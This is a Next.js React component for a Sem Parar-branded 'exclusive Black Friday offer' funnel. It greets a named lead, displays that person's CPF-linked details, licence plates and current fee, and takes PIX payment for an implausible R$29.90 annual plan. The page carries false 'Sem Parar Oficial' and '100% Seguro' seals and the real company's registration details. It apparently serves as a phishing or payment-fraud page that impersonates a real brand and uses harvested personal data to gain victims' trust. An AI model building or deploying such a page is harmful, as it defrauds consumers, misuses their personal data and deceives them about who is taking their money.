'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import {
  Car,
  ParkingCircle,
  Fuel,
  Package,
  Smartphone,
  Mail,
  ShieldCheck,
  Check,
  CircleCheckBig
} from 'lucide-react';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
  mensalidadeAtual: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState<'offer' | 'checkout' | 'success'>('offer');
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [copied, setCopied] = useState(false);
  const [formData, setFormData] = useState({
    cpf: lead.cpf || '',
    telefone: '',
    placa: lead.placas[0] || '',
    paymentMethod: 'pix',
  });

  const promoPrice = 29.90;
  const mensalidadeAtual = lead.mensalidadeAtual || 49.90;

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleConfirm = async () => {
    if (!formData.cpf) return;

    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: lead.nome,
          email: lead.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) throw new Error('Falha ao gerar PIX');

      const pix = await response.json();
      setPixData(pix);
    } catch (error) {
      alert('Erro ao gerar pagamento. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();
        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
          setStep('success');
        }
      } catch (error) {
        console.error('Error checking payment:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-[#e6e6e6]">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
          <Image src="/logo.png" alt="Sem Parar" width={120} height={32} className="h-8 w-auto" />
          <div className="hidden sm:flex items-center gap-6 text-sm text-[#0e0d0d]">
            <span>Para voce</span>
            <span>Para empresas</span>
          </div>
        </div>
      </header>

      {/* PAGINA DA OFERTA */}
      {step === 'offer' && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          {/* Badge */}
          <div className="text-center mb-6">
            <span className="inline-block bg-[#d60b52] text-white text-xs font-semibold px-4 py-1.5 rounded-full">
              OFERTA EXCLUSIVA
            </span>
          </div>

          {/* Titulo */}
          <div className="text-center mb-6">
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-4">
              {lead.firstName}, voce foi selecionado!
            </h1>

            {/* Preco destaque */}
            <div className="mb-2">
              <span className="text-[#d60b52] text-5xl sm:text-6xl font-bold">
                R$ {promoPrice.toFixed(2).replace('.', ',')}
              </span>
            </div>
            <p className="text-[#0e0d0d] text-lg font-medium mb-1">pelo ano inteiro</p>
            <p className="text-[#666] text-sm">
              De R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes • 95% de Economia
            </p>
          </div>

          {/* Card com dados do cliente */}
          <div className="bg-[#f8f8f8] rounded-xl p-5 mb-6">
            <div className="flex items-center gap-3 mb-4 pb-4 border-b border-[#e6e6e6]">
              <div className="w-12 h-12 bg-[#d60b52] rounded-full flex items-center justify-center text-white text-xl font-bold">
                {lead.firstName.charAt(0)}
              </div>
              <div>
                <p className="text-[#0e0d0d] font-semibold">{lead.nome}</p>
                <p className="text-[#666] text-sm">{lead.cidade}/{lead.estado}</p>
              </div>
              <div className="ml-auto">
                <span className="inline-block bg-[#dcfce7] text-[#166534] text-xs font-medium px-2 py-1 rounded-full">
                  Cliente Sem Parar
                </span>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 text-center">
              <div>
                <p className="text-[#d60b52] text-2xl font-bold">{lead.qtdVeiculos}</p>
                <p className="text-[#666] text-xs">Veiculo{lead.qtdVeiculos !== 1 ? 's' : ''}</p>
              </div>
              <div>
                <p className="text-[#d60b52] text-2xl font-bold">{lead.tags.length}</p>
                <p className="text-[#666] text-xs">TAG{lead.tags.length !== 1 ? 's' : ''} Ativas</p>
              </div>
              <div className="col-span-2 sm:col-span-2">
                <div className="flex flex-wrap gap-1 justify-center">
                  {lead.placas.slice(0, 3).map((placa, i) => (
                    <span key={i} className="bg-white border border-[#e6e6e6] text-[#0e0d0d] text-xs font-mono px-2 py-1 rounded">
                      {placa}
                    </span>
                  ))}
                  {lead.placas.length > 3 && (
                    <span className="text-[#666] text-xs py-1">+{lead.placas.length - 3}</span>
                  )}
                </div>
                <p className="text-[#666] text-xs mt-1">Placas Cadastradas</p>
              </div>
            </div>
          </div>

          {/* Beneficios Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
              <div className="text-[#d60b52] flex justify-center mb-2">
                <Car className="w-8 h-8" strokeWidth={1.5} />
              </div>
              <p className="text-[#0e0d0d] text-xs font-semibold">1 Ano Sem</p>
              <p className="text-[#0e0d0d] text-xs font-semibold">Pedagio</p>
            </div>
            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
              <div className="text-[#d60b52] flex justify-center mb-2">
                <ParkingCircle className="w-8 h-8" strokeWidth={1.5} />
              </div>
              <p className="text-[#0e0d0d] text-xs font-semibold">1 Ano Sem</p>
              <p className="text-[#0e0d0d] text-xs font-semibold">Estacionamento</p>
            </div>
            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
              <div className="flex justify-center mb-2">
                <Image src="/mcdonalds.svg" alt="McDonald's" width={32} height={32} className="h-8 w-auto" />
              </div>
              <p className="text-[#0e0d0d] text-xs font-semibold">30% OFF</p>
              <p className="text-[#0e0d0d] text-xs font-semibold">McDonald's</p>
            </div>
            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
              <div className="text-[#d60b52] flex justify-center mb-2">
                <Fuel className="w-8 h-8" strokeWidth={1.5} />
              </div>
              <p className="text-[#0e0d0d] text-xs font-semibold">-R$ 0,20</p>
              <p className="text-[#0e0d0d] text-xs font-semibold">/Litro</p>
            </div>
          </div>

          {/* Info adicional */}
          <div className="flex items-center justify-center gap-6 mb-6 text-sm text-[#666]">
            <span className="flex items-center gap-1.5">
              <Check className="w-4 h-4 text-[#16a34a]" strokeWidth={2.5} /> Sem fidelidade
            </span>
            <span className="flex items-center gap-1.5">
              <Check className="w-4 h-4 text-[#16a34a]" strokeWidth={2.5} /> Cancele quando quiser
            </span>
          </div>

          {/* CTA */}
          <button
            onClick={() => setStep('checkout')}
            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors"
          >
            Quero aproveitar esta oferta
          </button>
        </main>
      )}

      {/* CHECKOUT / PAGAMENTO */}
      {step === 'checkout' && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          {/* Titulo */}
          <div className="text-center mb-8">
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">
              Finalize seu Sem Parar Black Friday
            </h1>
          </div>

          {/* Resumo do plano */}
          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-[#0e0d0d] font-semibold">Plano Anual +</p>
                <p className="text-[#666] text-sm">4 Beneficios Black Friday</p>
              </div>
              <p className="text-[#d60b52] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
            </div>
          </div>

          {/* Formulario */}
          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
            {/* Dados Pessoais */}
            <div className="mb-6">
              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados Pessoais</p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                  placeholder="CPF"
                />
                <input
                  type="text"
                  value={formData.telefone}
                  onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                  placeholder="Telefone"
                />
              </div>
            </div>

            {/* Dados do Veiculo */}
            <div className="mb-6">
              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados do Veiculo</p>
              <input
                type="text"
                value={formData.placa}
                onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                placeholder="Placa"
              />
            </div>

            {/* Forma de Pagamento */}
            <div>
              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Forma de Pagamento</p>
              <select
                value={formData.paymentMethod}
                onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] bg-white"
              >
                <option value="pix">Pix</option>
                <option value="cartao">Cartao</option>
              </select>
            </div>
          </div>

          {/* QR Code PIX */}
          {pixData && (
            <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6 text-center">
              <p className="text-[#0e0d0d] font-semibold mb-4">Escaneie o QR Code ou copie o codigo</p>
              {pixData.qrCodeBase64 && (
                <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-48 h-48 mx-auto mb-4" />
              )}
              <div className="flex gap-3 max-w-md mx-auto">
                <code className="flex-1 text-[#0e0d0d] text-xs bg-[#f8f8f8] border border-[#e6e6e6] rounded-lg p-3 text-left truncate">
                  {pixData.copyPaste}
                </code>
                <button
                  onClick={handleCopyPix}
                  className="bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold px-4 py-2 rounded-lg transition-colors"
                >
                  {copied ? 'Copiado!' : 'Copiar'}
                </button>
              </div>
              <p className="text-[#666] text-sm mt-4 flex items-center justify-center gap-2">
                <span className="w-2 h-2 bg-[#fbbf24] rounded-full animate-pulse"></span>
                Aguardando pagamento...
              </p>
            </div>
          )}

          {/* Selos de seguranca */}
          <div className="flex items-center justify-center gap-8 mb-6">
            <div className="flex items-center gap-2 text-[#666] text-sm">
              <ShieldCheck className="w-5 h-5 text-[#16a34a]" strokeWidth={1.5} />
              <span>Ambiente 100% Seguro</span>
            </div>
            <div className="flex items-center gap-2 text-[#666] text-sm">
              <CircleCheckBig className="w-5 h-5 text-[#d60b52]" strokeWidth={1.5} />
              <span>Sem Parar Oficial</span>
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={handleConfirm}
            disabled={loading || !formData.cpf}
            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4"
          >
            {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
          </button>

          <button
            onClick={() => setStep('offer')}
            className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors"
          >
            ← Voltar
          </button>
        </main>
      )}

      {/* CONFIRMACAO & ATIVACAO */}
      {step === 'success' && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-10 sm:py-16 w-full">
          {/* Check icon */}
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto mb-6">
              <Check className="w-10 h-10 text-[#16a34a]" strokeWidth={3} />
            </div>
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold mb-2">
              Assinatura Confirmada!
            </h1>
            <p className="text-[#666] text-lg">
              Beneficios Black Friday Ativos
            </p>
          </div>

          {/* Proximos passos */}
          <div className="max-w-md mx-auto space-y-4">
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
                <Package className="w-6 h-6" strokeWidth={1.5} />
              </div>
              <div>
                <p className="text-[#0e0d0d] font-semibold">Envio da TAG para seu endereco</p>
                <p className="text-[#666] text-sm">Chegara em ate 7 dias uteis</p>
              </div>
            </div>
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
                <Smartphone className="w-6 h-6" strokeWidth={1.5} />
              </div>
              <div>
                <p className="text-[#0e0d0d] font-semibold">Acesso imediato no App Sem Parar</p>
                <p className="text-[#666] text-sm">Baixe na App Store ou Google Play</p>
              </div>
            </div>
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
                <Mail className="w-6 h-6" strokeWidth={1.5} />
              </div>
              <div>
                <p className="text-[#0e0d0d] font-semibold">Comprovante enviado por E-mail</p>
                <p className="text-[#666] text-sm">Verifique sua caixa de entrada</p>
              </div>
            </div>
          </div>
        </main>
      )}

      {/* Footer */}
      <footer className="border-t border-[#e6e6e6] mt-auto">
        <div className="max-w-[800px] mx-auto px-4 py-6 text-center">
          <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-6 w-auto mx-auto mb-4 opacity-50" />
          <p className="text-[#999] text-xs">
            DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61
          </p>
        </div>
      </footer>
    </div>
  );
}
